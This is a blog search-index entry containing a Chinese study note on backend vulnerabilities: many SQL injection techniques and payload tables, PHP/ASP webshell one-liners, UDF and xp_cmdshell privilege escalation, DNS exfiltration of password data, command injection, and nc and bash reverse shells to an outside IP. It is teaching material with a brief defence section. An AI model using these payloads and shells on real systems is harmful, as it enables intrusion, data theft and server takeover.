[{"content":"","permalink":"http://localhost:1313/about/","summary":"","title":"About"},{"content":"SQL注入漏洞（上） 注入：在原有结构基础上填充新的内容，引发结构逻辑变化 SQL与数据库典型案例 1. 猜数字游戏 对于字母、数字以及特殊符号 -\u0026gt; 采用ASCII码，范围是0~127 对于汉字 -\u0026gt; 采用GBK或Unicode编码 攻击者在读取数据库时，通常利用数据库函数将其内容转化为ASCII码再进行猜测 四部曲： 正常的网站交互行为 select * from post_log where id = 1 布尔逻辑探测,验证输入的内容是否会拼接进入SQL语句 select * from post_log where id = 1 and 1 = 1 布尔逻辑探测 select * from post_log where id = 1 and 1 = 2 2和3的主要目的是通过对比网页返回的内容印证猜想，猜对和猜错分别会给出什么提示 4. 发起攻击\nselect * from post_log where id = 1 and (select ascii(mid(username,1,1))from user limit 1)\u0026lt;97 含义：数据库admin表中的username字段存储的第一条记录的第一个字母是什么，它的ASCII编码小于97吗？\n主流SQL注入工具采用二分法，一般取中间64开始 在手动测试中，由于某些情况下已知该字段信息范围可能存储的是字母或数字，所以以97为入手点较多，因为97是小写字母a，其余小写字母\u0026gt;97，大写字母和数字\u0026lt;97；若是小写字母，则范围缩小到26个小写字母和四个特殊符号“{”（ASCII码123）；“|”（124）；“}”（125）；“~”（126） 以此方法批量获取数据库中所有的数据库名称、表名称、表结构和表中的数据 -\u0026gt; 拖库攻击 2. “EDELETE操作”，清空数据库 某些网站经常会设计删除功能（eg删除评论、订单等），其实就是数据库的“DELETE操作” #正常删除 delete from post_log where id = 15543 #删除一条记录 #攻击 delete from post_log where id = 15543 or 1=1 #删除整个表 SQL注入检测方法与攻击方法 参考：[[SQL注入]] 报错注入 1. 基于报错的SQL注入检测方法 注入时尝试拼接单引号、反斜杠字符，例如“id = 1'” 通过观察是否报错，判断拼接的单引号是否起作用（单引号提前闭合，引起语法错误；原本正常的单引号被转义符打破，形成未闭合的语句）\n2. 基于报错的SQL注入攻击 主要的10种MYSQL报错注入方法 序号 函数 Payload 1 floor() select * from test where id=1 and (select 1 from (select count(*),coucat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) 2 extractvalue() select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))) 3 updatexml() select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) 4 geometrycollection() select * from test where id=1 and geometrrycollection((select * from(select * from(select user())a)b)) 5 multipoint() select * from test where id=1 and multipoint((select * from(select * from(select user())a)b)) 6 polygon() select * from test where id=1 and polygon((select * from(select * from(select user())a)b)) 7 multipolygon() select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b)) 8 linestring() select * from test where id=1 and linestring((select * from(select * from(select user())a)b)) 9 multilinestring() select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b)) 10 exp() select * from test where id=1 and exp(~(select * from(select user())a)) Union注入 基于Union的SQL注入检测方法 union注入要求两个查询的字段数相同 方法1：union select 1,2,3…… {由“1”“1,2”“1,2,3”依次猜想直到字段数一致} 方法2：在原有的URL后拼接“order by 1”“order by 2”来判断 -\u0026gt; 当出现报错时就说明字段数只有n-1 利用这个方法和二分法快速定位出字段数 当已经知道了字段数时，可以通过查询*id=-1 union select 1,2,3,\u0026hellip;\u0026hellip;*来观察各字段在何位置 基于Union的SQL注入攻击方法 检测找到回显的点是第3和第11字段后，可以将其替换为目标字段内容，构造SQL语句\nhttp://aaa.com/phpaacm/show.php?id=-1%20union%20select%201,2,username,4,5,6,7,8,9,10,password,12,13,14,15%20from%20cms_users 于是第3字段和第11字段就会显示username和password，而password字段的内容一般是经过md5加密的 使用union注入方法时，注入点不能出现在order by字段之后，这是SQL语法规定\n布尔注入 基于布尔的SQL注入检测 最简单的就是使用“and 1=1”“and 1=2”\n有些情况下由于网站具有WAF（Web应用防火墙）或者本身的拦截逻辑，导致“and 1=1”无效，可尝试等价方法变换Payload MySQL数据库布尔注入的常用方法 运算 Payload 或 1 or 1=1 异或 1 xor 1=1 按位与 1 \u0026amp; 1=1 与 1 \u0026amp;\u0026amp; 1=1 按位或 1 | 1=1 或 1 || 1=1 MySQL数据绕过等号过滤情况的常用方法 运算 Payload 大于 1\u0026gt;2 小于 1\u0026lt;2 大于等于 4\u0026gt;=3 小于等于 3\u0026lt;=2 不等于 5\u0026lt;\u0026gt;5 不等于 5!=5 兼容空值等于 3\u0026lt;=\u0026gt;4 MySQL数据绕过特殊符号过滤情况的常用方法 运算 Payload 在……和……之间 5 is between 1 and 6 模糊匹配 1 like 1 空值断言 1 is null 非空断言 1 is not null 正则匹配 1 is regexp 1 在数组中 1 in (1) 最终目的都是提交一个“True语句和一个“False语句”，从网页返回是否相同，来判断该位置是否存在SQL注入漏洞\n基于布尔的SQL注入攻击 一般用于盲注（无回显点且不能通过报错来读取数据的盲注） 重要前提：获取数据库结构\n常见数据库及其系统表 数据库 系统表 MySQL information_schema.tables Oracle all_tables、user_tables Microsoft SQL Server master、sysobjects Access 无 PostgreSQL pg_database、pg_tables DB2 sysibm 以MySQL为例\n判断数据库中有多少个数据库 1 and (select count(*) from information_shema.schemata)\u0026gt;6 猜测第一个数据库的名称 1 and (select ascii(mid(schema_name,1,1)) from information_schema.schemata limit 0,1)\u0026gt;101 #schema_name是 information_schema.schemata表中的一列 通过修改结尾101来根据ASCII码来判断第一个数据库名称的第一个字母 通过修改mid函数的第二个参数值来依次猜解第一个数据库名称的后几位字母 通过修改”limit 0,1“的第一个数字”0“来依次递增获取其他数据库（”0“是第一个、”1“是第二个，依此类推） 判断指定数据库中有多少表 1 and (select count(*) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;)\u0026gt;4 猜测指定数据库第一张表的名称 1 and (select ascii(mid(table_name,1,1)) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; limit 0,1)\u0026gt;101 判断指定数据库指定表中有多少个字段 1 and (select count(*) form information_schema.columns where table_name=\u0026#39;user\u0026#39; and table_schema=\u0026#39;security\u0026#39;\u0026gt;5) 猜测指定数据库指定表的第一个字段 1 and (select ascii(mid(column_name,1,1)) from information_schema.columns where table_name=\u0026#39;user\u0026#39; and table_schema=\u0026#39;security\u0026#39;)\u0026gt;101 获取指定数据库指定表的数据量 1 and (select count(*) from security.user)\u0026gt;6 获取指定数据库指定表的第一条数据的第一个字段 1 and (select ascii(mid(username,1,1))from security.user limit 0,1)\u0026gt;101 时间注入 利用时间的长短来判断SQL注入点是否存在，根据时间长短来得到SQL语句执行结果是”True“还是”False“\n基于时间的SQL注入检测 发送请求id=1 and sleep(3)，若网站延迟3s，则基本可以判定此处存在SQL注入漏洞\n实际检测中，先观察网站的平均延迟情况，然后基于这个延迟情况，对参数加上sleep函数的Payload来进行测试。如果网站产生了明显的延迟，就证明了这个函数被执行了。 sleep(4)的延迟时间不一定是4s，还可能是8s、12s、16s……但基本上是4的倍数且大于等于4 这主要是由于数据库中返回结果的数据量可能并不为1条，最终延迟时间= 返回的数据量 x 时间参数 所以只需要判断时间不小于sleep参数即可 有些网站架构为了保证网站快速响应，会在数据库查询时间大于一定阈值的情况下强制提前返回 例如阈值设置为2s，那么无论采用sleep(3)还是sleep(10)，即使有SQL注入，也都会在2s左右返回，因此要注意产生干扰 类似（导致语句执行时间明显延长）函数1：benchmark ”benchmark(count,epr)“函数重复”count“次执行表达式”expr“，用于计时MySQL处理表达式有多快，结果总是0 给”expr“设置一个需要消耗一定性能和时间成本的计算（常用哈希计算），然后给”count“一个较大的次数，则执行时间花费就明显\nbenchmark(10000000,md5(1)) 类似（导致语句执行时间明显延长）方法2：笛卡尔积法 利用数据库的笛卡尔积操作带来大量计算产生时间延长\nselect * from user,g1 # 笛卡尔积 需要两张字段数量多、存储记录多的”大表“ 例如：系统表information_schema\n(select count(*) from information_schema.columns A, information_schema.tables B, information_schema.tables C); 对于网站与数据库长连接的情况，还可以使用get_lock函数对某变量进行锁定，当其他连接访问该变量时，访问会根据get_lock第二个参数所设定的时间进行延迟返回 步骤： 启动两个MySQL本地连接 select get_lock('do9gy',1); 对”do9gy“变量”上锁“，由于”do9gy“变量本身并没有被锁定，因而是不会有时间延长的 所以此次操作完成时间只有0.01s select get_lock('do9gy',5); 此次访问本锁定的变量，因而该查询等待5s后才返回，因而可用于时间注入 需注意：需要网站和数据库之间建立长连接，即PHP语言中mysql_pconnect函数所启用的连接 不同数据库引擎的sleep函数 SQLSever WAITFOR DELAY \u0026#39;0;0;6\u0026#39; #执行之后引发6s延迟 PostgreSQL pg_sleep(3) #执行后引发3s延迟 #后续增加了两个延迟执行函数pg_sleep_for和pg_sleep_until Oracle DBMS_PIPE,RECEIVE_MESSAGE(\u0026#39;a\u0026#39;,7) #执行后引发7s延迟 #还有一个decode函数，通过decode条件匹配all_objects所有条目带来的时间延迟 select decode(substr(user,1,1),\u0026#39;s\u0026#39;,(select count(*) from all_objects),0) from dual 基于时间的SQL注入检测具有不可控性，可能会带来数据库大量运算导致数据库拒绝服务\n基于时间的SQL注入攻击 在网站无回显，并且在无法使用Union、报错注入的情况下才会考虑（盲注攻击） 与布尔注入流程类似，在具体Payload构造上有些细微区别，主要思路是利用if函数造成差异\n1 and if(ascii(substr(user(),2,1))\u0026lt;114,sleep(5),1) #根据网站是否延迟5s返回来了解user()函数执行结果中的第二个字符的ASCII码是否小于114 #MySQL中，user()函数返回当前数据库建立连接的用户名与Host DNS查询注入（DNS外带注入） 外带法（将查询内容通过其他通道带出来）\n基于DNS查询的SQL注入检测 MySQL函数load_file，主要用于读取文件 Windows下，有UNC语法，支持读取其他域名下的文件 -\u0026gt; 攻击者可以通过构造请求，将数据传递到它自己搭建的域名服务器\nUNC是一种命名惯例，主要用于在Windows系统上指定和映射网络驱动器（最多被应用在局域网中访问文件服务器或者打印机上） UNC命名三个组成部分：服务器名、共享名和一个可选的文件路径，通过反斜杠连接 \\\\server\\share\\file_path 只针对Windows服务器有效，所以使用DNS外带注入也仅限于数据库服务器采用Windows操作系统的情况，有局限性 具体发送DNS请求的SQL语句：\nselect load_file(\u0026#39;\\\\\\www.moonslow.com\\\\a.txt\u0026#39;) 当语句被拼接进入SQL执行引擎后，会向www.moonslow.com发送\\\\www.moonslow.com\\a.txt请求，需要搭建一条NS服务器，并且给域名增加一条NS记录指向该NS服务器 -\u0026gt; 如果该域名被解析，就可以在NS服务器上收到一条解析记录，就证明该位置存在SQL注入漏洞 测试时，一般采用随机字符组成域名前缀，如”s0gn0.moonslow.com“，以避免”www“这种较为常见的前缀被其他人偶然解析而带来干扰 该方法不仅只限于Windows平台，而且还受到MySQL配置选项”secure_file_priv“的制约\n基于DNS查询的SQL注入攻击 在发起DNS外带查询时，将域名中的子域名替换成需要获取的数据由于域名对于字符的限制，需要对数据进行编码 Hex是一个不错的选择，并且需要限定长度（不能大于63）\nselect load_file(connect(\u0026#39;\\\\\\\\\u0026#39;,(select substr(hex(password),1,20) from user limit 0,1), \u0026#39;.moonslow.com\\\\test.txt\u0026#39;)); Wireshark捕获到DNS查询： 2A383146354532314533.moonslow.com\nDNS外带注入的装载数据区域不一定非要使用前缀，也可以使用后面的路径，如在”moonslow.com“和\u0026quot;test.txt\u0026quot;之间拼接数据 但是原理与DNS有区别，因为不依赖域名解析，获取数据要监控的也不是DNS解析记录 ”moonslow.com“实际上会启用SMB协议，需要在指定服务器上搭建环境，Linux上可以使用Samba，在开启访问日志后，可以在日志中找到外带的数据 不需要使用任何DNS方法 起名为”SMB外带注入“ 基于SMB的SQL注入攻击 以CentOS7为操作系统\n安装samba yum install samba 使用”vi /etc/samba/smb.conf“修改配置文件 找到”security = user“，旧版本将”user“改为”share“；新版本需要在后面添加”map to guest = Bad User“ 同时将日志记录级别调到”10“（level 0~10，调到最高便于记录） log level = 10 再配置一个“test”共享 [test]\rcomment = Public stuff\rpath = /usr/local/test\rpublic = yes\rbrowseable = yes\rguest ok = yes 保存后重启Samba服务，找一台Windows环境的机器，在上面安装MySQL，（建议5.7.16以下版本，因为高版本有一个默认选项“secure_file_priv”，默认不允许load_file） select load_file(\u0026#39;\\\\\\\\10.0.0.1\\smb_test\\\\1.txt\u0026#39;); SQL注入点与HTTP协议 基于存在漏洞的参数类型，分为GET注入、POST注入、Cookie注入、Referer注入、User-Agent注入、Host注入、X-Forward-For注入等 除了参数内容，参数的key也发生过SQL注入问题 Key注入（键名注入）\n参数点位置对SQL注入的影响 select (1) * (2) from SQL_Injection (3) where id=1 (4) order by view_times (5) limit 0,1 (6) #编号表示注入点 注入点在SQL语句中的位置越靠前，可操控性越强，注入利用的可能性越大\n闭合符对SQL注入的影响 常见的闭合场景有无闭合符 以单引号、双引号、搜索符（“ ‘%a%’ ”）、括号和单引号（“(\u0026lsquo;1\u0026rsquo;)”）作为闭合符 还有混合型 根据闭合符不同可以将SQL注入划分为整型（数字型）注入、字符型注入、搜索型（like）注入和 In注入等\n整型注入（数字型注入） 注入参数两侧都没有任何闭合符号（数据库处理的参数都是整型、浮点型等数字）\nselect * from SQL_Injection where id = 1 select * from SQL_Injection where id = 1 and 1=1 字符型注入 注入的两侧闭合符多为单引号，有时也有双引号\nselect * from SQL_Injection where name = \u0026#39;a\u0026#39; select * from SQL_Injection where name = \u0026#39;a\u0026#39; and 1=1 and \u0026#39;a\u0026#39;=\u0026#39;a\u0026#39; 通过插入 “ ‘ and \u0026lsquo;a\u0026rsquo;=\u0026lsquo;a ” 与 \u0026quot; \u0026rsquo; and \u0026lsquo;a\u0026rsquo;=\u0026lsquo;b \u0026ldquo;，打破原本的闭合边界，于是可以在and之前自由地插入新的判断逻辑来玩成注入 后面的“ and \u0026lsquo;a\u0026rsquo;=\u0026lsquo;a ”主要是用于闭合最后的单引号，保证语法的正确性。也可以用“#”来屏蔽后续的语句 select * from SQL_Injection where name = \u0026#39;a\u0026#39; and 1=1 #\u0026#39; 在MySQL中，“#”仅作用于单行，如果后续的语句有换行的情况，使用“#”不成立，仍然需要“ \u0026lsquo;a\u0026rsquo;=\u0026lsquo;a ”的闭合方法 搜索型注入 本质还是字符型注入，常见于lie之后使用的模糊匹配\nselect * from SQL_Injection where name like \u0026#39;%a%\u0026#39; select * from SQL_Injection where name like \u0026#39;%a%\u0026#39; and \u0026#39;%\u0026#39;=\u0026#39;%\u0026#39; In注入 select * from SQL_Injection where id in (1,2,3) select * from SQL_Injection where id in (1,2,3) and (1)=(1) #数字型的In注入 select * from SQL_Injection where id in (‘1’,‘2’,‘3’) and (‘1’)=(‘1’)#字符型的In注入 混合型注入 假设SQL语句场景如下\nselect * from SQL_Injection where name = \u0026#39;\u0026#34;a\u0026#34;\u0026#39;; 这里构造a\u0026rdquo; \u0026lsquo;and\u0026rsquo; \u0026ldquo;a\u0026rdquo; \u0026lsquo;=\u0026rsquo; \u0026ldquo;a来完成闭合\nselect * from SQL_Injection where name = \u0026#39;\u0026#34;a\u0026#34;\u0026#39; and \u0026#39;\u0026#34;a\u0026#34;\u0026#39;=\u0026#39;\u0026#34;a\u0026#34;\u0026#39;; 不同SQL引擎下的SQL注入 不同数据库的时间延迟函数 MySQL sleep(5) Oracle DBMS_PIPE_RECEIVE_MESSAGE(\u0026lsquo;a\u0026rsquo;,5) Microsoft SQL Server WAITFOR DELAY \u0026lsquo;00:00：05\u0026rsquo; Access 无 PostgreSQL pg_sleep(5) 数据库指纹识别：不同SQL引擎在语法结构和函数名称上存在差异，因此可以识别出网站采用的是哪一种数据库引擎 ThinkPHP5 SQL注入漏洞 \u0026lt;?php namespace app\\index\\controller; use app\\index\\model\\User; class Index { public function index() { $ids = input(\u0026#39;ids/a\u0026#39;); $t = new User(); $result = $t-\u0026gt;where(\u0026#39;id\u0026#39;,\u0026#39;in\u0026#39;,$ids)-\u0026gt;select(); } } SQL注入漏洞（下） SQL注入其他攻击思路 1. 读取文件 loasd_file()\nselect load_file(\u0026#39;/tmp/1\u0026#39;); # 文件名 select laod_file(\u0026#39;/tmp/1\u0026#39;)\u0026gt;0x48656C6C6F20576F726C640A; # 是以十六进制进行编码展示，也可比较 select hex(\u0026#39;/tmp/1\u0026#39;); # load_file函数可直接传递十六进制编码的文件路径 select load_file(0x2F746D702F31); # load_file函数可直接传递十六进制编码的文件路径 # 还可以使用char函数转码，以十进制的ASCII码提交路径 select load_file(char(47,116,109,112,47,49)); # 结合DNS查询注入的知识，在数据库服务器是Windows的情况下 select load_file(\u0026#39;\\\\target.com\\\\1.txt\u0026#39;); # 访问网络共享 2. 写入文件 (1) WebShell (网页木马) 意为 被攻击者写入并且能够成功执行的脚本 获取WebShell的过程也被称为GetSHell\n分为 大马 和 小马 （最小的WebShell是“一句话木马”） # ASP语言的一句话木马\r\u0026lt;%execute request(\u0026#34;x\u0026#34;)%\u0026gt;\r# PHP语言的一句话木马\r\u0026lt;?php eval($_POST[\u0026#39;x\u0026#39;])?\u0026gt;\r# x表示该木马的参数名 (2) SQL注入写文件 SQL注入攻击过程中，很重要的步骤是检测能否写入WebShell\nMySQL写入文件使用into outfile语句 select \u0026#39;hello cph\u0026#39; into outfile \u0026#39;/tmp/5\u0026#39;; # 写入的文件内容可以采用十六禁止编码 select 0x68656C6C6F20646F396779 into outfile \u0026#39;/tmp/5\u0026#39;; 后面的路径不能使用十六进制编码或者其他编码方式 因此，在网站严格禁止单引号使用\ndumpfile函数 区别在于：\ndumpfile只能导出一行 而outfile支持导出多行 dumpfile 保留数据的原始格式未进行转义 而outfile会对数据进行转义 3. UDF提权（User Defined Function） 从低权限的状态提升到高权限状态 用户自定义函数，是MySQL的一个拓展接口（实现在MySQL中创建一些MySQL无法直接实现的功能）它给攻击者留下了一个从SQL语句执行到系统调用的接口 三个步骤：\n把含有自定义函数（如执行系统调用函数“sys_eval”等）的dll文件（如Linux为so文件等）放入特定文件夹下 声明引入这个dll文件中的自定义函数 使用这个自定义的函数执行系统调用完成提权 MySQL版本大于5.1，udf.dll文件必须放在MySQL安装目录的llib\\plugin文件夹下（自己创建lib\\plugin文件夹）才可以创建自定义函数 MySQL版本大于5.1，udf.dll文件必须放在Windows Server 2003下的C:\\windows\\system32目录中；或者在Windows Server 2000下的C:\\winnt\\system32目录中\n写入文件完成后，创建自定义函数\ncreate function sys_eval returns string soname \u0026#39;udf.dll\u0026#39;; //导入udf函数 如果没有报错，就得到了一个新创建的自定义函数，使用这个函数可以成功以MySQL当前用户权限执行系统命令 例如：\nselect sys_eval(\u0026#39;ipconfig\u0026#39;); Linux提权只不过是导入udf.so 而不是udf.dll\n4. xp_cmdshell 针对Microsoft SQL Server xp_cmdshell是系统存储过程，可以将命令字符串作为操作系统命令执行，并以文本行的形式返回所有输出\nexec xp_cmdshell \u0026#39;ipconfig\u0026#39;; 常被用作一种提权手段，因为SQL Server默认运行在System权限\n堆叠查询 将多条查询语句以分号连接，合并为一条语句 可以在SQL注入点直接使用分号闭合前面的语句，然后另写一条新语句 需查看框架是否支持堆叠查询\n......;exec xp_cmdshell \u0026#39;ipconfig\u0026#39;; 万能密码 常见的万能密码 序号 常见的万能密码 1 a\u0026rsquo; or \u0026lsquo;a\u0026rsquo;=\u0026lsquo;a 2 a\u0026rsquo; or 1# 3 a\u0026rdquo; or \u0026ldquo;a\u0026rdquo;=\u0026ldquo;a 4 123 or 1 5 a\u0026rdquo;\u0026rsquo; or \u0026ldquo;\u0026lsquo;a\u0026rdquo;\u0026rsquo;=\u0026quot;\u0026lsquo;a 6 \u0026lsquo;or\u0026rsquo; 7 \u0026amp;mo# \u0026amp;mo# 是经过admin5加密后 变成了“ ’or‘ ” 是对admin5加密的一种注入 SQL注入漏洞的对抗 SQL注入的防御方法的核心思想是转义 将边界限定为单引号，参数中的内容统一进行一次转义，使之成为正真的数据\n1. 宽字节注入 思路：提交宽字节编码（如GBK）的半个字符，利用这半个字符和转义后的转义符“\\”结合，“吃掉”转义符，留下单独的单引号 前提：服务器脚本（如PHP）连接数据库时使用的是宽字节，且该编码中含有低字节位，如“0x5C”的字符，即转义符“\\” 举例： 网页URL提交内容“http://target.com/index.php?id=1”，当提交“id=1\u0026rsquo; ”时，服务器得到的SQL语句是select * from table where id=' 1\\' ' 转义符将单引号变成了正常数据，因而无法突破边界。 当提交“id=1%df’ ”时，服务器得到的SQL语句是select * from table where id= '1運' ' 原因：提交数据中的“ %df%27 ”被转义了，变成了“ %df%5C%27 ”，而“%df%5C”又对应了GBK编码中的“運”这个字符，于是“%5C”被吃掉了，留下来单独的一个“%27”，即单引号，突破SQL语句边界，此后就可以再拼接“and 1=1#”和“and 1=2#”来构造逻辑语句进行SQL注入 SQL注入保护的关键在于——突破转义字符，留下一个单独的单引号，就能从数据域穿越到代码域\n2. 二次注入 对于大多数数据库来说，存储数据前会对数据进行一次反转义，即将转移后的数据变成转义前的，于是经转义的“ ' ”就变成了“ ‘ ”，而一些CMS框架会再将数据库的数据取出来带入SQL语句查询，于是单独的那个单引号就会引发SQL注入问题\nSQLMAP sqlmap 是一款python语言开发的开源渗透测试工具，能自动检测和利用 SQL 注入漏洞并接管数据库服务器 当确定了一个注入点时，可将URL提交给SQLMAP来读取数据，利用python执行SQLMAP脚本\npython sqlmap.py -u \u0026#34;http://aaa.com/phpaacms/show.php?id=1\u0026#34; SQLMAP使用教程\nSQL注入漏洞防御 预编译绑定技术：将SQL执行的代码和参数进行区分 在无法使用预编译绑定的场景，做如下预防措施：\n对于数字型注入，对参数进行强制类型转换，转换为整型或浮点型 对于字符型注入，使用字符串转义及过滤的函数（PHP语言建议使用mysql_real_escape_string函数；Java语言建议使用StringEscapeUtils，同时对取出已入库数据时，如果会有再次传入数据库的情况，应当在第二次入库前再次进行字符串转义） 实战：Django GIS SQL注入漏洞 远程命令执行漏洞 也称命令注入漏洞（RCE） 例如：某PHP网站提供IP地址存活检测服务，服务器接收用户输入参数中传递的IP。然后将IP拼接进入ping命令，\n\u0026lt;?php exec(\u0026#34;ping -t 1 \u0026#34;.$_GET[\u0026#39;ip\u0026#39;],$output); var_dump($output); ?\u0026gt; 攻击者有可能提交这样的参数“ip=127.0.0.1 \u0026amp;\u0026amp; touch /tmp/a.txt”，由于“\u0026amp;”字符为URL关键字，直接填写在URL中是无法生效的，需要进行URL编码（“\u0026amp;”的URL编码是%26） 编码后的Payload：\nip=127.0.0.1%20%26%26%20touch%20/tmp/a.txt 反弹Shell 有时候会遇到服务器虽然执行了命令，但是没有回显结果的情况，于是出现一种手段启动Shell服务（也称正向Bash Shell）\n先使用“nc -e”快速启用Shell服务 nc -lvvp 1031 -e /bin/bash # NC会监听本地1031端口，一旦外来TCP请求与自己建立连接，就可以将外部传入的命令交给/bin/bash处理，也就实现了Shell服务 攻击者可以通过在本机使用NC建立连接 nc 服务器IP 1031 一般情况下这种正向Shell会被防火墙屏蔽，因为大多数的防火墙会默认屏蔽陌生的端口 新思路：利用端口反连技术，让服务器主动来连接自己，称为反弹Shell\n找到一台具有公网IP的服务器，如IP是1.1.1.1，然后在该IP上绑定端口 nc -lvvp 1031 攻击者在具有公网IP的服务器上获得受害服务器的Shell控制权 nc -e /bin/bash 1.1.1.1 1031 由于防火墙策略通常只会严格过滤从外向内（也即是入向流量），对于出向流量的策略比较宽松\n反弹Shell只是一种技术原理，与NC并没有太大关系，还可以使用其他脚本语言来反弹 （1）Bash反弹\nbash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/9999 0\u0026gt;\u0026amp;1 （2）Perl反弹Shell （3）Python反弹Shell脚本 （4）Ruby反弹Shell脚本\n命令拼接符 Linux/macOs与Windows的命令拼接方式 编号 Linux/macOs Windows 1 pwd|touch 1 whoami|mkdir 1 2 pwd;touch 1 - 3 pwd\u0026amp;touch 1 whoami\u0026amp;mkdir 1 4 pwd\u0026amp;\u0026amp;touch 1 whoami\u0026amp;mkdir 1 5 pwd`touch 1` - 6 pwd$(touch 1) - 7 pw||touch 1 whooami||mkdir 1 8 pwdtouch 1 whoamimkdir 1 \u0026quot;$(touch 1)\u0026ldquo;在Linux系统中拥有较高的执行优先权，可以优先使用该方法测试 使用“||”符号连接两条命令时，在Linux系统下要求前一条命令出错，后面拼接的命令才能执行，因此故意将这里的“pwd\u0026quot;写成”pw“，造成语法错误 第8行中可利用的换行符在URL编码情况下可以是”%0a“和”%0d%0a“ 对于Linux系统下一些无法使用空格的场景，可以使用”$IFS“来代替空格，如”cat$IFS/etc/passwd“，这样可以绕过某些防御策略 远程代码执行漏洞 也称代码注入漏洞（RCE） 前提条件：\n网站本身调用存在执行代码的函数 将代码插入文件中解析执行 通过特定表达式解析代码 PHP远程代码执行 原理：构造原有的执行语句闭合并且再引入一个自己想要执行的函数\n\u0026lt;?php if (isset($_GET[\u0026#39;id\u0026#39;])) { $id = $_GET[\u0026#39;id\u0026#39;]; eval(\u0026#34;var_dump($id);\u0026#34;); } ?\u0026gt; 参数$id可以传入**);phpinfo(** 得到\nvar_dump();phpinfo(); 或者\naaa.com:51006/8.eval.php?id=);echo%20exec(%27id%27);var_dump( 白盒审计远程代码漏洞挖掘 PHP与代码执行漏洞有关的函数 函数名 函数解释 eval 直接执行PHP代码 assert 与eval函数功能相同。但不完全等价，略有区别 preg_replace 其/e模式可导致PHP代码执行 create_function 创建匿名函数执行代码 array_map 将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组 call_user_func 将传入的函数作为assert函数的参数 call_user_func_array 将传入的函数作为数组的一个值传递给assert函数 array_filter 用回调函数过滤数组中的元素；array_filter(数组,函数) usort 使用用户自定义的比较函数对数组进行排序 uasort 同usot include、include_once、require、require_once 包含文件或协议作为PHP代码来源 ","permalink":"http://localhost:1313/post/%E4%BC%A0%E7%BB%9F%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/","summary":"\u003ch1 id=\"sql注入漏洞上\"\u003eSQL注入漏洞（上）\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e注入：在原有结构基础上填充新的内容，引发结构逻辑变化\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"sql与数据库典型案例\"\u003eSQL与数据库典型案例\u003c/h2\u003e\n\u003ch3 id=\"1-猜数字游戏\"\u003e1. 猜数字游戏\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e对于字母、数字以及特殊符号 -\u0026gt; 采用ASCII码，范围是\u003ccode\u003e0~127\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e对于汉字 -\u0026gt; 采用GBK或Unicode编码\u003c/li\u003e\n\u003cli\u003e攻击者在读取数据库时，通常利用数据库函数将其内容转化为ASCII码再进行猜测\n\u003cstrong\u003e四部曲：\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003e正常的网站交互行为\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-SQL\" data-lang=\"SQL\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eselect\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003efrom\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003epost_log\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003ewhere\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eid\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003col start=\"2\"\u003e\n\u003cli\u003e布尔逻辑探测,\u003cstrong\u003e验证输入的内容是否会拼接进入SQL语句\u003c/strong\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-SQL\" data-lang=\"SQL\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eselect\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003efrom\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003epost_log\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003ewhere\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eid\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eand\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003col 